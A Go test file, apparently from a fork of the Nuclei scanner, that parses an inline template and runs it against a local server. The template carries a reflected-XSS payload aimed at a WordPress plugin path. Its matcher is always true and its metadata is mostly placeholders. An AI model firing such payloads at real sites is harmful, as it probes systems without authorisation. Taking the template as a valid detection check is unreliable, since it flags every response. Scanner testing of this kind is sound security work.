package nuclei

import (
	"context"
	"fmt"
	"github.com/secoba/nuclei/v3/pkg/input/provider"
	"github.com/secoba/nuclei/v3/pkg/output"
	"github.com/secoba/nuclei/v3/pkg/templates"
	"testing"
)

func TestMulti(t *testing.T) {
	ne, err := NewNucleiEngineCtx2(context.Background())
	if err != nil {
		panic(err)
	}

	templateString := `
# 插件ID（自动生成）
id: CNVD-2023-08743

# 插件基本信息
info:
  name: 插件名                       # (必须)
  author: anonymous
  severity: critical # info|low|medium|high|critical  (必须)
  description: 插件描述信息
  impact: 漏洞影响
  remediation: |                    # (必须)
    修复建议
  reference:
    - 'https://test.com'
  metadata:
    cve: ''                         # CVE编号
    cnvd: ''                        # CNVD编号
    cnnvd: ''                       # CNNVD编号
    fingerprint_id: ''              # 指纹ID
  tags:
    - 'tag1'
  classification:
    cve-id: 'CVE-2023-2640'
    #    cvss-metrics: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H'
    #    cvss-score: 7.8
    #    cwe-id: 'CWE-863'
    #    epss-score: 0.00047
    #    epss-percentile: 0.14754
    #    cpe: 'cpe:2.3:o:canonical:ubuntu_linux:23.04:*:*:*:*:*:*:*'

# Nuclei语法
# 在线生成：https://cloud.projectdiscovery.io/
http:
  - raw:
      - |
        GET /wp-content/plugins/simple-urls/admin/assets/js/import-js.php?search=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - '200 == 200'

`
	template, err := ne.ParseTemplate([]byte(templateString))
	if err != nil {
		panic(err)
	}

	// wait for all scans to finish
	//sg.Wait()

	inputProvider := provider.NewSimpleInputProviderWithUrls([]string{"http://localhost:8000"}...)
	ne.engine.ExecuteWithResults(context.Background(), []*templates.Template{template}, inputProvider, func(event *output.ResultEvent) {
		fmt.Println(event.Request)
		fmt.Println(event.Response)
	})
	//engine.Execute(ctx, templates, inputProvider)
	ne.engine.WorkPool().Wait()

	//ret, _, err := ne.ExecuteNucleiWithOptsCtx2(context.Background(),
	//	[]string{"http://localhost:8000"},
	//	[]*templates.Template{template},
	//)
	//if err != nil {
	//	panic(err)
	//}
	//
	//fmt.Println(ret)
	defer ne.Close()
}
